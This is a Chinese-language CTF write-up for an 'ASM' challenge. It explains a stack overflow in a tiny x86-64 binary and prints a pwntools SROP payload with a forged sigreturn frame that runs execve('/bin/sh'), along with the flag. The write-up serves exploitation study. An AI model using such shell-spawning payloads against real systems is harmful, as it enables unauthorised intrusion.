# ASM

## 题目简述

程序由手写 x86-64 汇编实现：栈上只分配 `0x20` 字节，却用 `read` 读取 `0x200` 字节。二进制很小，现成 gadget 有限，但存在 `syscall`，适合构造 SROP。

## 解题过程

覆盖返回地址的偏移是 32 字节。第一阶段让程序再次执行 `read`，随后只发送 15 字节，使 `read` 的返回值 `rax` 变为 15，也就是 x86-64 的 `rt_sigreturn` 系统调用号。再返回到 `syscall`，内核就会从栈上恢复伪造的信号帧。

伪造帧设置：

```python
frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = 0x40200f    # 程序 .rodata 中的 "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x401047    # syscall

payload  = b"A" * 32
payload += p64(0x40101b)  # 再次进入 read 路径
payload += p64(0x401047)  # 以 rax=15 触发 sigreturn
payload += bytes(frame)
```

发送主载荷后再发送恰好 15 字节，信号帧恢复后执行 `execve("/bin/sh", NULL, NULL)`。读取 flag：

```text
n00bz{SR0P_1$_s0_fun_r1ght??}
```

## 方法总结

SROP 适合只有 `syscall`、缺少常规 ROP gadget 的小型静态二进制。关键不仅是伪造寄存器，还要精确控制前一次系统调用的返回值为 15。
